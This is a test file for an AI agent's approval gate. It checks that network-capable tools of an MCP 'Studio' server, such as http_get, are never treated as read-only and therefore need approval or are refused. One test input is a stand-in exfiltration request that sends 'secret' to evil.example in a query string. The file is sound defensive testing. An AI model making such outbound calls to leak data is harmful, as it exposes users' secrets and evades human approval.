import { afterAll, describe, expect, it } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { outsideMcpFor, outsideMcpStep } from '../services/outsideMcp.js';
import { McpServerStore } from '../services/outsideMcpStore.js';
import { STUDIO_READ_TOOLS, STUDIO_SERVER, writeStudioRecipe } from './gameTools.js';

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-recipe-'));
afterAll(() => fs.rmSync(dir, { recursive: true, force: true }));

/** The Studio recipe as a turn in its room loads it from mcp-servers.json. */
function studioAsMounted() {
  const file = path.join(dir, 'mcp-servers.json');
  writeStudioRecipe(new McpServerStore(file), path.join(dir, 'mcp.bat'), 'room-1', { SystemRoot: 'C:\\Windows' });
  const s = outsideMcpFor('artist', { id: 'room-1', name: 'game' }, file).find((x) => x.name === STUDIO_SERVER);
  expect(s).toBeDefined();
  return s!;
}

describe('Studio recipe: tools that can reach the network are not read tools', () => {
  // A GET to any URL carries data out in its query string, so it is not "read only" for approval purposes.
  const OUTBOUND = ['http_get', 'open_cloud_invoke', 'upload_image', 'submit_feedback', 'create_skill', 'edit_skill'];

  it('lists none of them on readTools', () => {
    for (const t of OUTBOUND) expect(STUDIO_READ_TOOLS).not.toContain(t);
    expect(studioAsMounted().readTools.filter((t) => OUTBOUND.includes(t))).toEqual([]);
  });

  it('under ask, http_get gets the normal card (pass), not a silent allow', () => {
    const s = studioAsMounted();
    const step = outsideMcpStep(s, 'http_get', { url: 'https://evil.example/?d=secret' }, { bypass: false });
    expect(step).toEqual({ kind: 'pass' });
    // A real read tool still runs with no card.
    expect(outsideMcpStep(s, 'script_read', {}, { bypass: false })).toEqual({ kind: 'allow' });
  });

  it('in read-only mode, http_get is refused like any other write', () => {
    const step = outsideMcpStep(studioAsMounted(), 'http_get', { url: 'https://x.example/' }, { bypass: false, readOnly: true });
    expect(step.kind).toBe('refuse');
  });

  it('under bypass it still runs: no tool is blocked (owner decision 4)', () => {
    expect(outsideMcpStep(studioAsMounted(), 'http_get', { url: 'https://x.example/' }, { bypass: true })).toEqual({ kind: 'pass' });
  });
});
